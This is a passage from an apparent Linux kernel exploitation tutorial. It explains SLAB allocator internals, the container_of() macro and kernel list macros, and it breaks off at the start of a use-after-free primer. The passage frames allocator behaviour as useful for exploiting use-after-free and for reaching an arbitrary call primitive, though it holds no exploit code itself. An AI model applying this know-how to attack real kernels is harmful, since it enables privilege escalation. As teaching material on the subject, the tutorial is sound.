is somehow inefficient (e.g. accessing lists require some locking, need to find the offset in the slab, etc.).</p><p>In order to <em>boost</em> the performance, the Slab stores an array of pointers to free objects. This array is the <strong>struct array_cache</strong> data structure and is stored in the <strong>array</strong> field of a <em>struct kmem_cache</em>.</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">array_cache</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">avail</span><span class="p">;</span><span class="w">       </span><span class="c1">// number of pointers available AND index to the first free slot</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="p">;</span><span class="w">       </span><span class="c1">// maximum number of pointers</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">batchcount</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">touched</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">spinlock_t</span><span class="w"> </span><span class="n">lock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">entry</span><span class="p">[];</span><span class="w">            </span><span class="c1">//  the actual pointers array</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p><strong>The <em>array_cache</em> itself is used as a <em>Last-In First-Out (LIFO)</em> data structure (i.e. a stack).</strong> This is an <em>awesome</em> property from an exploiter point-of-view! This is the main reason why exploiting use-after-free is easier on SLAB than SLUB.</p><p>In the <em>fastest</em> code path, allocating memory is as simple as:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="nf">____cache_alloc</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="o">*</span><span class="n">cachep</span><span class="p">,</span><span class="w"> </span><span class="n">gfp_t</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"> </span><span class="c1">// yes... four "_"</span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">objp</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">array_cache</span><span class="w"> </span><span class="o">*</span><span class="n">ac</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">ac</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cpu_cache_get</span><span class="p">(</span><span class="n">cachep</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">STATS_INC_ALLOCHIT</span><span class="p">(</span><span class="n">cachep</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">touched</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">objp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">[</span><span class="o">--</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">];</span><span class="w">        </span><span class="c1">// &lt;-----</span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">objp</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In the very same way, the <em>fastest</em> free code path is:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__cache_free</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="o">*</span><span class="n">cachep</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">objp</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">array_cache</span><span class="w"> </span><span class="o">*</span><span class="n">ac</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cpu_cache_get</span><span class="p">(</span><span class="n">cachep</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">limit</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">STATS_INC_FREEHIT</span><span class="p">(</span><span class="n">cachep</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">[</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">objp</span><span class="p">;</span><span class="w">          </span><span class="c1">// &lt;-----</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In other words, allocation/free operations have a <em>O(1)</em> complexity in the best scenario case.</p><p><strong>WARNING</strong>: If the <em>fastest</em> path fails, then the allocation algorithm falls back to a slower solution (scan free/partial slab lists) or even slower (cache grow).</p><p>Note that <strong>there is one array_cache per cpu</strong>. The array cache of the currently running cpu can be retrieved with <strong>cpu_cache_get()</strong>. Doing so (like any per-cpu variables) allows to reduce <em>locking</em> operations, hence boost the performance.</p><p><strong>WARNING: Each object pointer in the array cache might belong to different slabs!</strong></p><h2 id="general-purpose-and-dedicated-caches">General Purpose and Dedicated Caches</h2><p>In order to reduce <em>internal fragmentation</em>, the kernel creates several caches with a power-of-two object size (32, 64, 128, ...). It guarantees that the internal fragmentation will always be smaller than 50%. In fact, when the kernel tries to allocate memory of a particular size, it searches the closest upper-bounded cache where the object can fit. For instance, allocating 100 bytes will land into the 128 bytes cache.</p><p>In the SLAB, general purpose caches are prefixed with "size-" (e.g. "size-32", "size-64"). In the SLUB, general purpose caches are prefixed with "kmalloc-" (e.g. "kmalloc-32", ...). Since we think the SLUB convention is better, we will always use it even if our target runs with the SLAB.</p><p><strong>In order to allocate/free memory from a <em>general purpose</em> cache, the kernel uses <em>kmalloc()</em> and <em>kfree()</em>.</strong></p><p>Because some objects will be allocated/freed a lot, the kernel creates some special "dedicated" caches. For instance, the <em>struct file</em> object is an object used in lots of places which has its own dedicated cache (filp). By creating a dedicated cache for these objects, it guarantees that the internal fragmentation of those caches will be near zero.</p><p><strong>In order to allocate/free memory from a <em>dedicated</em> cache, the kernel uses <em>kmem_cache_alloc()</em> and <em>kmem_cache_free()</em>.</strong></p><p>In the end, both <em>kmalloc()</em> and <em>kmem_cache_alloc()</em> land in the <strong>__cache_alloc()</strong> function. Similarly, both <em>kfree()</em> and <em>kmem_cache_free()</em> end in <strong>__cache_free()</strong>.</p><p><strong>NOTE</strong>: You can see the full list of caches as well as handful information in <strong>/proc/slabinfo</strong>.</p><h2 id="the-container_of-macro">The container_of() Macro</h2><p>The <strong>container_of()</strong> macro is used all over the place in the Linux kernel. Sooner or later you will need to understand it. Let's look at the code:</p><div class="highlight"><pre><span></span><code><span class="cp">#define container_of(ptr, type, member) ({          \</span>
<span class="cp">    const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);    \</span>
<span class="cp">    (type *)( (char *)__mptr - offsetof(type,member) );})</span>
</code></pre></div><p>The purpose of <em>container_of()</em> macro is to <strong>retrieve the address of a structure from one of its members</strong>. It uses two macros:</p><ul><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Typeof.html">typeof()</a> - define a compile-time type</li><li><a href="https://en.wikipedia.org/wiki/Offsetof">offsetof()</a> - find the offset (in bytes) of a field in a structure</li></ul><p>That is, it takes the current field address and subtracts its offset from the "embedder" structure. Let's take a concrete example:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">foo</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">a</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">b</span><span class="p">;</span><span class="w">  </span><span class="c1">// offset=8</span>
<span class="p">}</span><span class="w"></span>

<span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">get_foo_from_b</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// "ptr" points to the "b" field of a "struct foo"</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">container_of</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">foo</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kt">void</span><span class="w"> </span><span class="n">bar</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">foo</span><span class="w"> </span><span class="n">f</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"f=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">f</span><span class="p">);</span><span class="w">         </span><span class="c1">// &lt;----- print 0x0000aa00</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"&amp;f-&gt;b=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;----- print 0x0000aa08</span>

<span class="w">  </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_foo_from_b</span><span class="p">(</span><span class="o">&amp;</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"ptr=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span><span class="w">      </span><span class="c1">// &lt;----- print 0x0000aa00, the address of "f"</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><h2 id="doubly-linked-circular-list-usage">Doubly-Linked Circular List Usage</h2><p>The Linux kernel makes an extensive use of doubly-linked circular list. It is important to understand them in general AND it is required here to reach our arbitrary call primitive. Instead of just looking at the actual implementation, we will develop a simple example to understand how they are used. By the end of this section, you should be able to <strong>understand the <em>list_for_each_entry_safe()</em> macro</strong>.</p><p><strong>NOTE</strong>: To keep this section simple, we will simply use "list" instead of <em>"doubly-linked circular list"</em>.</p><p>To handle the list, Linux uses a single structure:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This is a dual-purpose structure that can be either used to:</p><ol><li>Represent the list itself (i.e. the "head")</li><li>Represent an element in a list</li></ol><p>A list can be initialized with the <strong>INIT_LIST_HEAD</strong> function which makes both <em>next</em> and <em>prev</em> field point to the list itself.</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">INIT_LIST_HEAD</span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">list</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">list</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">list</span><span class="o">-&gt;</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">list</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Let's define a fictional <em>resource_owner</em> structure:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">consumer_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">init_resource_owner</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">strncpy</span><span class="p">(</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="s">"MYRESOURCE"</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>To use a list, each element (e.g. consumer) of that list must <strong>embed</strong> a <em>struct list_head</em> field. For instance:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">list_elt</span><span class="p">;</span><span class="w">    </span><span class="c1">// &lt;----- this is NOT a pointer</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This consumer is added/removed to the list with <strong>list_add()</strong> and <strong>list_del()</strong> function respectively. A typical code is:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">add_consumer</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">rc</span><span class="p">),</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">list_elt</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Next, we want to release a consumer but we only have a pointer from the list entry (bad design intended). We retrieve the structure with <em>container_of()</em> macro, delete the element from the list and free it:</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">release_consumer_by_entry</span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">consumer_entry</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// "consumer_entry" points to the "list_elt" field of a "struct resource_consumer"</span>
<span class="w">  </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">container_of</span><span class="p">(</span><span class="n">consumer_entry</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="p">,</span><span class="w"> </span><span class="n">list_elt</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">list_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">kfree</span><span class="p">(</span><span class="n">rc</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Then, we want to provide a helper to retrieve a resource consumer based on its <em>id</em>. We will need to iterate over the whole list using the <strong>list_for_each()</strong> macro:</p><div class="highlight"><pre><span></span><code><span class="cp">#define list_for_each(pos, head) \</span>
<span class="cp">    for (pos = (head)-&gt;next; pos != (head); pos = pos-&gt;next)</span>

<span class="cp">#define list_entry(ptr, type, member) \</span>
<span class="cp">    container_of(ptr, type, member)</span>
</code></pre></div><p>As we can see, we need to use the <em>container_of()</em> macro because <em>list_for_each()</em> only gives us a <em>struct list_head</em> pointer (i.e. iterator). This operation is often replaced with the <strong>list_entry()</strong> macro (which does the exact same thing, but has a <em>better</em> name):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="o">*</span><span class="w"> </span><span class="n">find_consumer_by_id</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">list_for_each</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">list_entry</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="p">,</span><span class="w"> </span><span class="n">list_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">rc</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// not found</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Having to declare a <em>struct list_head</em> variable and using <em>list_entry()/container_of()</em> macros is actually a bit heavy. Because of this, there is the <strong>list_for_each_entry()</strong> macro (which uses <em>list_first_entry()</em> and <em>list_next_entry()</em> macros):</p><div class="highlight"><pre><span></span><code><span class="cp">#define list_first_entry(ptr, type, member) \</span>
<span class="cp">    list_entry((ptr)-&gt;next, type, member)</span>

<span class="cp">#define list_next_entry(pos, member) \</span>
<span class="cp">    list_entry((pos)-&gt;member.next, typeof(*(pos)), member)</span>

<span class="cp">#define list_for_each_entry(pos, head, member)              \</span>
<span class="cp">    for (pos = list_first_entry(head, typeof(*pos), member);    \</span>
<span class="cp">         &amp;pos-&gt;member != (head);                    \</span>
<span class="cp">         pos = list_next_entry(pos, member))</span>
</code></pre></div><p>We can re-write the previous code with a more compact version (without declaring a <em>struct list_head</em> anymore):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="o">*</span><span class="w"> </span><span class="n">find_consumer_by_id</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">list_for_each_entry</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">,</span><span class="w"> </span><span class="n">list_elt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">rc</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// not found</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Next, we want a function that releases every consumer. This raises two problems:</p><ul><li>our <em>release_consumer_by_entry()</em> function is poorly designed and takes a <em>struct list_head</em> pointer in argument</li><li>the <em>list_for_each()</em> macro expect the list to be <strong>immutable</strong></li></ul><p>That is, we can't release an element while walking the list. This would lead to <em>use-after-free</em> (they are everywhere...). To address this issue, the <strong>list_for_each_safe()</strong> has been created. It "prefetches" the next element:</p><div class="highlight"><pre><span></span><code><span class="cp">#define list_for_each_safe(pos, n, head) \</span>
<span class="cp">    for (pos = (head)-&gt;next, n = pos-&gt;next; pos != (head); \</span>
<span class="cp">        pos = n, n = pos-&gt;next)</span>
</code></pre></div><p>It implies that we will need to declare two <em>struct list_head</em>:</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">release_all_consumers</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">list_for_each_safe</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">release_consumer_by_entry</span><span class="p">(</span><span class="n">pos</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Finally, we realized that <em>release_consumer_by_entry()</em> was ugly, so we rewrite it using a <em>struct resource_consumer</em> pointer in argument (no more container_of()):</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">release_consumer</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rc</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rc</span><span class="o">-&gt;</span><span class="n">list_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">kfree</span><span class="p">(</span><span class="n">rc</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Because it does not take a <em>struct list_head</em> in argument anymore, our <em>release_all_consumers()</em> function can be rewritten with the <strong>list_for_each_entry_safe()</strong> macro:</p><div class="highlight"><pre><span></span><code><span class="cp">#define list_for_each_entry_safe(pos, n, head, member)          \</span>
<span class="cp">    for (pos = list_first_entry(head, typeof(*pos), member),    \</span>
<span class="cp">        n = list_next_entry(pos, member);           \</span>
<span class="cp">         &amp;pos-&gt;member != (head);                    \</span>
<span class="cp">         pos = n, n = list_next_entry(n, member))</span>
</code></pre></div><p>That is:</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">release_all_consumers</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_owner</span><span class="w"> </span><span class="o">*</span><span class="n">ro</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">resource_consumer</span><span class="w"> </span><span class="o">*</span><span class="n">rc</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ro</span><span class="o">-&gt;</span><span class="n">consumer_list</span><span class="p">,</span><span class="w"> </span><span class="n">list_elt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">release_consumer</span><span class="p">(</span><span class="n">rc</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Nice, our code does not use <em>struct list_head</em> variables anymore.</p><p>Hopefully, you now understand the <strong>list_for_each_entry_safe()</strong> macro. If not, read this section again. It is <strong>mandatory</strong> to understand it because it will be used to reach our <em>arbitrary call primitive</em> in the exploit. We will even look at it in assembly (because of offsets)! Better to understand it now...</p><hr><h1 id="use-after-free-101">Use-after-free 101</h1><p>This section will cover the basic theory of use-after-free, expose the pre-requisites to exploit them and the most common exploitation strategy.</p><h2 id="the-pattern">The Pattern</h2><p>It is hard to find a better name for this kind of vulnerability as it describes everything in its name. The simplest pattern of a <em>use-after-free</em> is:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span><span class="w"></span>
